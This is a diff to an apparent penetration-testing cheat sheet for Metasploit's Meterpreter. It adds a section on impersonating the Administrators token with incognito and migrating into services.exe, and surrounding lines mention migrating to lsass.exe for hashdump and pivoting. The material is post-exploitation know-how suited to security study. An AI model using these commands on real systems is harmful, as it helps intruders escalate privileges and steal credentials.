@@ -61,6 +61,26 @@ description: A Metasploit attack payload that provides an interactive shell.
  > Ex : Migrate to a word.exe and act like a keylogger.
  > Ex: Migrate to lsass.exe to run hashdump.
 
+## METERPRETER Impersonate
+
+When **SeDebugPrivilege** or **SeImpersonatePrivilege** are enabled, we can impersonate another user.
+
+ > 
+ > **<font color=red>load incognito</font>**</br>
+ > **<font color=red>list_tokens -g</font>**</br>
+ > List tokens.
+ > 
+ > **<font color=red>impersonate_token</font> "BUILTIN\\Administrators"**</br>
+ > Impersonate token.
+
+To determine rights, Windows uses the Primary Token of the process and not the impersonated token. So we have to migrate to a process with correct permissions. 
+
+The safest to pick is **services.exe**.
+
+ > 
+ > **<font color=red>migrate</font> 668**</br>
+ > Migrate to process 668.
+
 ## METERPRETER Pivoting
 
 When we have a meterpreter shell on a machine that has access to another network, we can use it to gain access to the 2nd network.
